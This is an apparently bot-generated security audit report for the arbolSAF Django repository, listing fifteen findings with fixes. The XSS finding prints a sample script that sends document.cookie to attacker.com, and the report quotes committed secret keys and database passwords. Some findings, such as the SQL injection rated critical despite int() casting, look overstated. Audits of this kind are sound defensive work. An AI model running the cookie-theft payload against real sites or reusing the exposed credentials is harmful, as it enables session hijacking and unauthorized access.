# Security Vulnerability Assessment Report
## arbolSAF Repository

**Date:** 2025-11-05
**Severity Levels:** 🔴 Critical | 🟠 High | 🟡 Medium | 🔵 Low

---

## Executive Summary

This security assessment identified **15 vulnerabilities** across multiple categories, including:
- 3 Critical vulnerabilities
- 5 High severity vulnerabilities
- 4 Medium severity vulnerabilities
- 3 Low severity vulnerabilities

**Immediate action required** for Critical and High severity issues.

---

## Critical Vulnerabilities 🔴

### 1. SQL Injection Vulnerability
**Severity:** 🔴 Critical
**Location:** `arbolsaf/views/species_views.py:183-203`
**CWE:** CWE-89 (SQL Injection)

**Description:**
Raw SQL queries are constructed using string formatting with user-supplied input, allowing SQL injection attacks.

**Vulnerable Code:**
```python
cursor.execute("""
    Select distinct as2.id from
    arbolsaf_species as2 join arbolsaf_variable av on(av.especie_id=as2.id)
    join arbolsaf_variable_type avt on(avt.id=av.tipo_variable_id)
    where avt.id={}
""".format(int(query['tipo_variable'])))
```

**Attack Vector:**
Although `int()` provides some protection, an attacker could potentially manipulate the query parameter to inject SQL commands.

**Recommendation:**
- Use parameterized queries with placeholders
- Replace `.format()` with proper parameter binding:
```python
cursor.execute("""
    SELECT DISTINCT as2.id FROM
    arbolsaf_species as2
    JOIN arbolsaf_variable av ON(av.especie_id=as2.id)
    JOIN arbolsaf_variable_type avt ON(avt.id=av.tipo_variable_id)
    WHERE avt.id=%s
""", [query['tipo_variable']])
```

---

### 2. Exposed Secrets in Version Control
**Severity:** 🔴 Critical
**Location:**
- `.env` (root)
- `Despliegue/.env`
- `Despliegue/docker-env/web.env`
- `Despliegue/docker-env/pgadmin.env`

**CWE:** CWE-312 (Cleartext Storage of Sensitive Information)

**Description:**
Environment files containing sensitive credentials are committed to the repository and **NOT** in `.gitignore`.

**Exposed Secrets:**
1. **SECRET_KEY:** `S3cr3t_K#Key`
2. **Database credentials:** `DB_USER=mypassword`, `DB_PASSWORD=mypassword`
3. **Server configuration:** Production server hostnames

**Risk:**
- Anyone with repository access can obtain production credentials
- Attackers can forge session tokens using the SECRET_KEY
- Database can be compromised with exposed credentials

**Recommendation:**
1. **Immediate Actions:**
   - Rotate all exposed credentials immediately
   - Change SECRET_KEY in production
   - Change database passwords

2. **Add to `.gitignore`:**
```
# Environment files
.env
*.env
Despliegue/.env
Despliegue/docker-env/*.env
```

3. **Remove from git history:**
```bash
git filter-branch --force --index-filter \
  "git rm --cached --ignore-unmatch .env Despliegue/.env Despliegue/docker-env/*.env" \
  --prune-empty --tag-name-filter cat -- --all
```

---

### 3. DEBUG Mode Enabled in Production
**Severity:** 🔴 Critical
**Location:** `core/settings.py:18`, `.env:1`
**CWE:** CWE-489 (Active Debug Code)

**Description:**
`DEBUG=True` is set in environment files, exposing sensitive information in error pages.

**Risk:**
- Exposes full stack traces with code snippets
- Reveals database schema and queries
- Shows environment variables and file paths
- Discloses internal application structure

**Vulnerable Configuration:**
```python
# core/settings.py
DEBUG = config('DEBUG', default=True, cast=bool)  # BAD: default=True

# .env
DEBUG=True  # BAD: Should be False in production
```

**Recommendation:**
```python
# core/settings.py
DEBUG = config('DEBUG', default=False, cast=bool)  # GOOD: default=False

# .env (production)
DEBUG=False
```

---

## High Severity Vulnerabilities 🟠

### 4. Cross-Site Scripting (XSS) Vulnerability
**Severity:** 🟠 High
**Location:** `arbolsaf/templates/arbolsaf/species/species_detail.html:256`
**CWE:** CWE-79 (Cross-site Scripting)

**Description:**
User-generated content is rendered with `|safe` filter, bypassing Django's auto-escaping.

**Vulnerable Code:**
```django
{% firstof specie.notas|safe|default_if_none:"-"|linebreaks %}
```

**Attack Vector:**
If a user can control the `notas` field, they can inject malicious JavaScript:
```html
<script>document.location='http://attacker.com/?cookie='+document.cookie</script>
```

**Recommendation:**
1. Remove `|safe` filter if HTML is not required:
```django
{% firstof specie.notas|default_if_none:"-"|linebreaks %}
```

2. If rich text is needed, sanitize with `bleach` library:
```python
import bleach
allowed_tags = ['p', 'br', 'strong', 'em', 'u']
clean_notes = bleach.clean(specie.notas, tags=allowed_tags, strip=True)
```

---

### 5. Weak Default SECRET_KEY
**Severity:** 🟠 High
**Location:** `core/settings.py:15`
**CWE:** CWE-798 (Use of Hard-coded Credentials)

**Description:**
A weak, predictable SECRET_KEY is used as default fallback.

**Vulnerable Code:**
```python
SECRET_KEY = config('SECRET_KEY', default='S#perS3crEt_1122')
```

**Risk:**
- Attackers can forge session cookies
- CSRF tokens can be predicted
- Password reset tokens can be generated

**Recommendation:**
```python
# NEVER have a default SECRET_KEY
SECRET_KEY = config('SECRET_KEY')  # Will raise error if not set

# Or check explicitly
SECRET_KEY = config('SECRET_KEY', default='')
if not SECRET_KEY or SECRET_KEY == 'S#perS3crEt_1122':
    raise ValueError("SECRET_KEY must be set in environment variables")
```

Generate a strong key:
```bash
python -c 'from django.core.management.utils import get_random_secret_key; print(get_random_secret_key())'
```

---

### 6. Weak Database Passwords
**Severity:** 🟠 High
**Location:** `Despliegue/docker-env/web.env:5-6`
**CWE:** CWE-521 (Weak Password Requirements)

**Description:**
Production database uses weak password "mypassword".

**Vulnerable Configuration:**
```
DB_USER=mypassword
DB_PASSWORD=mypassword
```

**Recommendation:**
- Generate strong passwords (minimum 16 characters, mixed case, numbers, symbols)
- Use a password manager or secure generation tool:
```bash
openssl rand -base64 32
```

---

### 7. Insufficient Security Headers
**Severity:** 🟠 High
**Location:** `core/settings.py` (missing configurations)
**CWE:** CWE-1021 (Improper Restriction of Rendered UI Layers)

**Description:**
Critical security headers are not configured, leaving the application vulnerable to various attacks.

**Missing Headers:**
- `X-Frame-Options` (Clickjacking protection)
- `Content-Security-Policy` (XSS mitigation)
- `X-Content-Type-Options` (MIME-sniffing protection)
- `Strict-Transport-Security` (HTTPS enforcement)
- `Referrer-Policy` (Information leakage)

**Recommendation:**
Add to `core/settings.py`:
```python
# Security Headers
SECURE_BROWSER_XSS_FILTER = True
SECURE_CONTENT_TYPE_NOSNIFF = True
X_FRAME_OPTIONS = 'DENY'

# If using HTTPS (REQUIRED for production)
SECURE_SSL_REDIRECT = True
SESSION_COOKIE_SECURE = True
CSRF_COOKIE_SECURE = True
SECURE_HSTS_SECONDS = 31536000  # 1 year
SECURE_HSTS_INCLUDE_SUBDOMAINS = True
SECURE_HSTS_PRELOAD = True

# Content Security Policy (adjust as needed)
CSP_DEFAULT_SRC = ("'self'",)
CSP_SCRIPT_SRC = ("'self'", "'unsafe-inline'", "cdn.datatables.net", "code.jquery.com")
CSP_STYLE_SRC = ("'self'", "'unsafe-inline'", "cdn.datatables.net")
```

Install django-csp:
```bash
pip install django-csp
```

Add to MIDDLEWARE:
```python
MIDDLEWARE = [
    'django.middleware.security.SecurityMiddleware',
    'csp.middleware.CSPMiddleware',  # Add this
    # ... rest of middleware
]
```

---

### 8. Command Injection Risk via subprocess
**Severity:** 🟠 High
**Location:** `arbolsaf/views/species_views.py:686`
**CWE:** CWE-78 (OS Command Injection)

**Description:**
Although the current implementation uses `shell=False`, the subprocess call could be vulnerable if user input were added.

**Current Code:**
```python
result = subprocess.run(["python3", "manage.py", "updatedata"],
                       shell=False, stdout=subprocess.PIPE,
                       stderr=subprocess.PIPE, check=False)
```

**Risk:**
- Currently not exploitable, but risky pattern
- No authentication/authorization check on this endpoint
- Could cause DoS by triggering expensive operations

**Recommendation:**
1. Add proper authentication and authorization
2. Implement rate limiting
3. Consider using Django management command directly:
```python
from django.core.management import call_command
call_command('updatedata')
```

---

## Medium Severity Vulnerabilities 🟡

### 9. Overly Permissive ALLOWED_HOSTS
**Severity:** 🟡 Medium
**Location:** `core/settings.py:21`
**CWE:** CWE-346 (Origin Validation Error)

**Description:**
ALLOWED_HOSTS is configured from untrusted environment variable.

**Current Code:**
```python
ALLOWED_HOSTS = ['localhost', '127.0.0.1', config('SERVER', default='127.0.0.1')]
```

**Risk:**
- Vulnerable to Host header injection attacks
- Can lead to password reset poisoning
- Cache poisoning attacks

**Recommendation:**
```python
# Explicitly list all allowed hosts
ALLOWED_HOSTS = [
    'localhost',
    '127.0.0.1',
    'arbolsaf.denebinc.com',  # Your production domain
]

# Or validate the SERVER config
SERVER = config('SERVER', default='127.0.0.1')
if SERVER not in ['127.0.0.1', 'localhost', 'arbolsaf.denebinc.com']:
    raise ValueError(f"Invalid SERVER value: {SERVER}")
ALLOWED_HOSTS = ['localhost', '127.0.0.1', SERVER]
```

---

### 10. File Upload Without Extension Validation
**Severity:** 🟡 Medium
**Location:** `arbolsaf/models.py:876`
**CWE:** CWE-434 (Unrestricted Upload of File with Dangerous Type)

**Description:**
ImageField accepts uploads without proper extension/content validation.

**Current Code:**
```python
imagen = models.ImageField(verbose_name=_("Imagen"), upload_to="imagenes_especie")
```

**Risk:**
- Malicious files can be uploaded
- Potential for remote code execution if files are accessible
- Storage exhaustion attacks

**Recommendation:**
1. Install and use django-cleanup for orphaned files
2. Add custom validator:
```python
from django.core.exceptions import ValidationError
import magic

def validate_image_file(file):
    # Check file size (e.g., 5MB limit)
    if file.size > 5 * 1024 * 1024:
        raise ValidationError("File size cannot exceed 5MB")

    # Validate file extension
    valid_extensions = ['.jpg', '.jpeg', '.png', '.gif']
    ext = os.path.splitext(file.name)[1].lower()
    if ext not in valid_extensions:
        raise ValidationError(f"Unsupported file extension: {ext}")

    # Validate MIME type (requires python-magic)
    file_type = magic.from_buffer(file.read(1024), mime=True)
    file.seek(0)
    if not file_type.startswith('image/'):
        raise ValidationError("File is not a valid image")

class ImageSpecies(models.Model):
    imagen = models.ImageField(
        verbose_name=_("Imagen"),
        upload_to="imagenes_especie",
        validators=[validate_image_file]
    )
```

3. Configure in settings.py:
```python
# File upload settings
FILE_UPLOAD_MAX_MEMORY_SIZE = 5242880  # 5MB
DATA_UPLOAD_MAX_MEMORY_SIZE = 5242880
```

---

### 11. Missing Rate Limiting
**Severity:** 🟡 Medium
**Location:** Authentication endpoints and API views
**CWE:** CWE-307 (Improper Restriction of Excessive Authentication Attempts)

**Description:**
No rate limiting on login attempts or API endpoints, allowing brute force attacks.

**Affected Endpoints:**
- `/login/`
- `/arbolsaf/especie/listado`
- JSON API endpoints

**Recommendation:**
Install django-ratelimit:
```bash
pip install django-ratelimit
```

Apply to views:
```python
from django_ratelimit.decorators import ratelimit

@ratelimit(key='ip', rate='5/m', method='POST')
def login_view(request):
    # existing code
    pass

@ratelimit(key='user', rate='100/h')
@login_required
def species_list_json(request):
    # existing code
    pass
```

---

### 12. Outdated Dependencies
**Severity:** 🟡 Medium
**Location:** `requirements.txt`
**CWE:** CWE-1104 (Use of Unmaintained Third Party Components)

**Description:**
Several packages are outdated and may contain known vulnerabilities.

**Vulnerable Dependencies:**
- `Django==3.2.6` (Latest: 3.2.23 or 4.2.x)
- `Pillow==10.0.0` (Security updates available)
- `PyYAML==6.0` (Check for latest)

**Recommendation:**
1. Update to latest stable versions:
```bash
pip install --upgrade Django Pillow PyYAML
pip freeze > requirements.txt
```

2. Regularly audit dependencies:
```bash
pip install pip-audit
pip-audit
```

3. Use Dependabot or similar tools for automated updates

---

## Low Severity Vulnerabilities 🔵

### 13. Clickjacking Protection Not Enforced
**Severity:** 🔵 Low
**Location:** `core/settings.py` (middleware present but not configured)
**CWE:** CWE-1021 (Improper Restriction of Rendered UI Layers)

**Description:**
While `XFrameOptionsMiddleware` is in MIDDLEWARE, X-Frame-Options is not explicitly set.

**Recommendation:**
```python
X_FRAME_OPTIONS = 'DENY'  # or 'SAMEORIGIN' if needed
```

---

### 14. Session Cookie Settings
**Severity:** 🔵 Low
**Location:** `core/settings.py` (missing configurations)
**CWE:** CWE-614 (Sensitive Cookie in HTTPS Session Without 'Secure' Attribute)

**Description:**
Session cookies lack security flags.

**Recommendation:**
```python
# Session Security
SESSION_COOKIE_HTTPONLY = True
SESSION_COOKIE_SECURE = True  # Only over HTTPS
SESSION_COOKIE_SAMESITE = 'Strict'
SESSION_COOKIE_AGE = 3600  # 1 hour (adjust as needed)

# CSRF Cookie Security
CSRF_COOKIE_HTTPONLY = True
CSRF_COOKIE_SECURE = True
CSRF_COOKIE_SAMESITE = 'Strict'
```

---

### 15. No Logging/Monitoring for Security Events
**Severity:** 🔵 Low
**Location:** Application-wide
**CWE:** CWE-778 (Insufficient Logging)

**Description:**
No security event logging for:
- Failed login attempts
- Permission denied errors
- SQL errors
- File upload failures

**Recommendation:**
Configure Django logging in settings.py:
```python
LOGGING = {
    'version': 1,
    'disable_existing_loggers': False,
    'formatters': {
        'verbose': {
            'format': '{levelname} {asctime} {module} {process:d} {thread:d} {message}',
            'style': '{',
        },
    },
    'handlers': {
        'file': {
            'level': 'WARNING',
            'class': 'logging.handlers.RotatingFileHandler',
            'filename': '/var/log/arbolsaf/security.log',
            'maxBytes': 1024*1024*15,  # 15MB
            'backupCount': 10,
            'formatter': 'verbose',
        },
        'console': {
            'level': 'INFO',
            'class': 'logging.StreamHandler',
            'formatter': 'verbose'
        },
    },
    'loggers': {
        'django.security': {
            'handlers': ['file', 'console'],
            'level': 'WARNING',
            'propagate': False,
        },
        'django.request': {
            'handlers': ['file', 'console'],
            'level': 'ERROR',
            'propagate': False,
        },
    },
}
```

---

## Remediation Priority

### Immediate (Within 24 hours):
1. ✅ Rotate all exposed credentials (SECRET_KEY, database passwords)
2. ✅ Set DEBUG=False in production
3. ✅ Add .env files to .gitignore
4. ✅ Fix SQL injection vulnerability

### Short-term (Within 1 week):
1. ⚠️ Remove XSS vulnerability (remove |safe filter)
2. ⚠️ Implement security headers
3. ⚠️ Add file upload validation
4. ⚠️ Remove secrets from git history

### Medium-term (Within 1 month):
1. 📋 Update dependencies
2. 📋 Implement rate limiting
3. 📋 Add security logging
4. 📋 Configure session/cookie security
5. 📋 Security audit of authentication flow

---

## Testing Recommendations

1. **Automated Security Scanning:**
```bash
pip install bandit safety
bandit -r arbolsaf/
safety check
```

2. **SAST (Static Application Security Testing):**
   - Use tools like SonarQube, Semgrep, or Snyk

3. **DAST (Dynamic Application Security Testing):**
   - OWASP ZAP
   - Burp Suite Community Edition

4. **Dependency Scanning:**
```bash
pip install pip-audit
pip-audit
```

---

## Compliance Considerations

This application should be reviewed against:
- **OWASP Top 10 (2021)** - Multiple violations identified
- **GDPR** - If handling EU citizen data
- **PCI DSS** - If handling payment data
- **ISO 27001** - Information security management

---

## Contact & Follow-up

For questions regarding this security assessment, please:
1. Review each vulnerability with the development team
2. Create tickets for each remediation item
3. Schedule a follow-up security review after fixes

**Report Generated By:** Security Audit Bot
**Assessment Date:** 2025-11-05
